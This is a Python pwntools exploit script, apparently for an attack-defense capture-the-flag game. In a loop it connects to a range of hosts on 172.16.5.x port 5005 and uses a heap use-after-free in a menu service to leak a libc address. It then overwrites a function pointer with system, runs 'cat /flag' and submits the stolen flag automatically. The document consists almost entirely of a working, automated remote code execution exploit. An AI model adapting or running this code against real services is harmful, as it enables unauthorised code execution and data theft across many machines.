import flag
from time import sleep
from pwn import *

debug=0
while 1:
    for x in xrange(10,27):
        try:
            if x==18:
                continue
            if debug:
                context.log_level = 'debug'
                p = process('./autoexp')
                gdb.attach(p, execute='b *0x04017BB')
                e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            else:
                p = remote('172.16.5.{}'.format(x), 5005, timeout=5)
                e = ELF('./server.libc')


            def add(name, parameters, datas):
                p.recvuntil('Option:')
                p.sendline('1')
                p.recvuntil(':')
                p.sendline(name)
                p.recvuntil(':')
                if type(parameters) is list:
                    for param in parameters:
                        p.sendline(param)
                else:
                    p.sendline(parameters)
                p.sendline()
                p.recvuntil(':')
                if type(datas) is list:
                    for data in datas:
                        p.sendline(data)
                else:
                    p.sendline(datas)
                p.sendline()


            def comment(funindex, length, cmt):
                p.recvuntil('Option:')
                p.sendline('3')
                p.recvuntil(':')
                p.sendline(str(funindex))
                p.recvuntil('Option:')
                p.sendline('9')
                p.recvuntil('the length of your comment')
                p.sendline(str(length))
                p.sendline(cmt)


            def deletefun(index):
                p.recvuntil('Option:')
                p.sendline('2')
                p.recvuntil(':')
                p.sendline(str(index))


            def modifyData(funindex, paramindex, content):
                p.recvuntil('Option:')
                p.sendline('3')
                p.recvuntil(':')
                p.sendline(str(funindex))
                p.recvuntil('Option:')
                p.sendline('6')
                p.recvuntil(':')
                p.sendline(str(paramindex))
                p.recvuntil('content')
                p.sendline(content)


            add('fun1', 'p1', 'd1')
            comment(1, 22, 'aaaa')
            add('fun2', 'p2', 'd2')
            deletefun(1)
            add('fun3', 'p3', 'd3')
            comment(2, 4, '\x20\x32\x60')
            p.recvuntil('Option:')
            p.sendline('5')
            p.recvuntil('fun3')
            p.recvuntil('writeline(')
            d = p.recvuntil(')')[:-1].ljust(8, '\x00')
            atoi = u64(d)
            log.success('strlen:' + hex(atoi))
            system = atoi - 0x812F0 + e.symbols['system']
            log.success('system:' + hex(system))
            modifyData(2, 1, p64(system)[:-1])
            p.sendline()
            p.recvuntil('Option:')
            p.sendline('0')
            comment(1, 20, '/bin/bash\x00')
            p.recvuntil('Option:')
            p.sendline('3')
            p.recvuntil(':')
            p.sendline('1')
            p.recvuntil('Option:')
            p.sendline('9')
            p.recvuntil('the length of your comment')
            p.sendline('20')
            p.sendline('cat /flag')
            p.recvuntil('\n')
            f = p.recvuntil('\n')[:-1]
            log.success('flag:' + f)
            print flag.send(f)
            p.close()
        except Exception as e:
            log.critical(e.message)
            p.close()
    sleep(150)


